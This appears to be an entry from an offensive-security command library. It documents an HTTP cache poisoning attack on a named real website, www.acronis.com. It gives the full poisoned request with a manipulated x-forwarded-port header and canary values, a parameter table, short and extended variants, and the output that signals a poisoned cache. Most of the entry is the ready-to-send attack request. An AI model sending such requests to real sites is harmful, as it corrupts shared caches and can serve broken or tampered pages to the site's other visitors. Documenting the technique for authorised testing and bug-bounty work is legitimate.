---
data: >-
  GET /zh-cn/careers/?yig1bt7ai4=1 HTTP/1.1

  Host: www.acronis.com

  Connection: close

  sec-ch-ua: "Chromium";v="86", "\"Not\\A;Brand";v="99", "Google Chrome";v="86"

  sec-ch-ua-mobile: ?0

  Upgrade-Insecure-Requests: 1

  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36
  (KHTML, like Gecko) Chrome/86.0.4240.80 Safari/537.36 yig1bt7ai4

  Accept:
  text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,
  text/yig1bt7ai4

  Sec-Fetch-Site: same-origin

  Sec-Fetch-Mode: navigate

  Sec-Fetch-User: ?1

  Sec-Fetch-Dest: document

  Referer: https://www.acronis.com/zh-cn/cloud/cyber-protect/

  Accept-Encoding: gzip, deflate, yig1bt7ai4

  Accept-Language: zh-CN,zh;q=0.9,en;q=0.8

  x-forwarded-port: zwrtxqvas9lm4kzkia

  Origin: https://yig1bt7ai4.com
tags:
  - http
  - poisoning
type: command
executor: bash
platforms:
  - Web
id: f8153c7b-781e-4a81-a548-ace3554924a5
created_at: '2025-12-13T09:00:34.187Z'
updated_at: '2025-12-13T09:00:34.187Z'
verified: false
validated: true
submitted: true
---
# Poison Request with X-Forwarded-Port

## Command

```bash
GET /zh-cn/careers/?yig1bt7ai4=1 HTTP/1.1
Host: www.acronis.com
Connection: close
sec-ch-ua: "Chromium";v="86", "\"Not\\A;Brand";v="99", "Google Chrome";v="86"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.80 Safari/537.36 yig1bt7ai4
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9, text/yig1bt7ai4
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://www.acronis.com/zh-cn/cloud/cyber-protect/
Accept-Encoding: gzip, deflate, yig1bt7ai4
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
x-forwarded-port: zwrtxqvas9lm4kzkia
Origin: https://yig1bt7ai4.com
```

## Description

Sends a poisoned HTTP request to manipulate the cache using x-forwarded-port and other modified headers, used in initial cache poisoning steps.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `x-forwarded-port` | Sets arbitrary port to poison cache, e.g., to force port 0 | Yes |
| `Origin` | Sets a custom origin for the request | Yes |
| `User-Agent` | Modified to include arbitrary string | Yes |
| `Accept` | Modified to include arbitrary text | Yes |
| `Accept-Encoding` | Modified to include arbitrary encoding | Yes |

## Examples

### Basic Usage

```bash
GET /zh-cn/careers/?yig1bt7ai4=1 HTTP/1.1
Host: www.acronis.com
x-forwarded-port: zwrtxqvas9lm4kzkia
```

### Advanced Usage

```bash
GET /zh-cn/careers/?yig1bt7ai4=1 HTTP/1.1
Host: www.acronis.com
x-forwarded-port: zwrtxqvas9lm4kzkia
Origin: https://yig1bt7ai4.com
User-Agent: Mozilla/5.0 ... yig1bt7ai4
```

## Expected Output

Response containing www.acronis.com:0 after repetition, indicating successful poisoning.

## Related

- [[procedures/Poison-Cache-with-X-Forwarded-Port]]
- [[commands/clean-request-confirm-poisoning]]
